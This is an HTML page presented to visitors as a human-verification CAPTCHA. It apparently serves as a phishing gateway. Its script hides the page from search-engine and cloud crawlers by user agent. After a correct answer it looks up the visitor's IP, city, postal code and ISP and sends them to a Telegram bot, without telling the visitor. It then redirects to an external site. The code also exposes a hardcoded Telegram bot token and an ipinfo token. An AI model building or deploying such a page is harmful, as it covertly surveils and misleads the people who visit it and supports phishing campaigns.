<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CAPTCHA with Telegram Logging</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .captcha-container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    .captcha-container h2 {
      text-align: center;
    }
    .captcha-box {
      margin: 20px 0;
      font-size: 20px;
      font-weight: bold;
      text-align: center;
      background: #eee;
      padding: 10px;
      border-radius: 5px;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 15px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    .error {
      color: red;
      text-align: center;
      margin-top: 10px;
    }
    .success {
      color: green;
      text-align: center;
      margin-top: 10px;
    }
    /* Honeypot field hidden for humans */
    .honeypot {
      display: none;
    }
  </style>
</head>
<body>
  <div class="captcha-container">
    <h2>Verify You're Human</h2>
    <div class="captcha-box" id="captchaQuestion"></div>
    <input type="text" id="captchaInput" placeholder="Enter your answer" />
    
    <!-- Honeypot field, hidden from users but visible to bots -->
    <input type="text" id="honeypot" class="honeypot" placeholder="Leave this empty" />
    
    <button id="submitBtn">Submit</button>
    <div id="captchaMessage"></div>
  </div>

  <script>
    let num1, num2, answer;
    let mouseMoved = false;
    let keyPressed = false;
    let pageLoadedTime;

    const botToken = "8096041390:AAGBcV0HBqFbmpkOpFy9LbiZczh-WqRQtQY";
    const chatId = "6529371358";

    // Regex to detect known bot user agents
    const botUserAgents = [
      /bot/i, /spider/i, /crawler/i, /google/i, /bing/i, /yandex/i, /slurp/i, /crawler/i, /msnbot/i, /facebookexternalhit/i, /azure/i
    ];

    // Function to detect if the request is from a known bot based on user-agent
    function isBot() {
      const userAgent = navigator.userAgent.toLowerCase();
      return botUserAgents.some((pattern) => pattern.test(userAgent));
    }

    // Check if mouse moved within the page
    document.addEventListener("mousemove", () => {
      mouseMoved = true;
    });

    // Check if a key was pressed
    document.addEventListener("keydown", () => {
      keyPressed = true;
    });

    // Detect suspicious referrer
    function isSuspiciousReferrer() {
      const referrer = document.referrer.toLowerCase();
      return !referrer || referrer.includes("suspicioussite.com");  // Customize with known bot sources
    }

    // Track page load time to detect very fast submissions (bots often submit immediately)
    pageLoadedTime = Date.now();

    // Function to prevent submission if bot-like behavior is detected
    function preventBotSubmission() {
      // Check for bot patterns
      if (isBot()) {
        return true; // Bot detected based on user-agent
      }

      // Check for suspicious referrer
      if (isSuspiciousReferrer()) {
        return true; // Suspicious referrer detected
      }

      // Check for missing human behavior (mouse movement or key presses)
      if (!mouseMoved || !keyPressed) {
        return true; // Missing mouse or key activity
      }

      // Check if the page was loaded too quickly (bots often don't spend time on a page)
      const timeSpent = Date.now() - pageLoadedTime;
      if (timeSpent < 3000) { // Less than 5 seconds (adjust as needed)
        return true; // Too fast submission, likely a bot
      }

      // Check if honeypot field is filled (likely a bot)
      const honeypotField = document.getElementById("honeypot").value.trim();
      if (honeypotField !== "") {
        return true; // Bot filled in the honeypot
      }

      return false; // No bot-like behavior detected
    }

    function generateCaptcha() {
      num1 = Math.floor(Math.random() * 10) + 1;
      num2 = Math.floor(Math.random() * 10) + 1;
      answer = num1 + num2;
      document.getElementById("captchaQuestion").innerText = `What is ${num1} + ${num2}?`;
      document.getElementById("captchaMessage").innerHTML = '';
      document.getElementById("captchaInput").value = '';
    }

    function getDeviceType() {
      const ua = navigator.userAgent;

      if (/iPhone|iPad|iPod/i.test(ua)) return "iOS Device";
      if (/Android/i.test(ua)) return "Android Device";
      if (/Windows/i.test(ua)) return "Windows PC";
      if (/Macintosh/i.test(ua)) return "macOS Device";
      if (/Linux/i.test(ua)) return "Linux Device";
      return "Unknown Device";
    }

    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const payload = {
        chat_id: chatId,
        text: message
      };

      try {
        await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }

    async function validateCaptcha() {
      // Prevent bot submission
      if (preventBotSubmission()) {
        document.getElementById("captchaMessage").innerHTML = "<p class='error'>Access blocked due to bot-like behavior.</p>";
        return;
      }

      const userAnswer = parseInt(document.getElementById("captchaInput").value.trim());
      const messageEl = document.getElementById("captchaMessage");

      if (userAnswer === answer) {
        messageEl.innerHTML = "<p class='success'>Verified! Redirecting... ✅</p>";

        try {
          const res = await fetch("https://ipinfo.io/json?token=4b4e37d7269136");
          const data = await res.json();
          const deviceType = getDeviceType();

          const userMessage = `
🔐 SIMPLE HELP
📱 Device: ${deviceType}
🌍 IP: ${data.ip}
🏙️ City: ${data.city}
📍 Region: ${data.region}
📦 Country: ${data.country}
📮 Postal: ${data.postal}
🕐 Timezone: ${data.timezone}
📡 ISP: ${data.org}
          `.trim();

          await sendToTelegram(userMessage);
        } catch (e) {
          console.warn("IP info error:", e);
        }

        setTimeout(() => {
          window.location.href = "https://web-orpin-xi.vercel.app";
        }, 1000);
      } else {
        messageEl.innerHTML = "<p class='error'>Incorrect. Please try again.</p>";
        generateCaptcha();
      }
    }

    document.addEventListener("DOMContentLoaded", () => {
      generateCaptcha();
      document.getElementById("submitBtn").addEventListener("click", validateCaptcha);
    });
  </script>
</body>
</html>
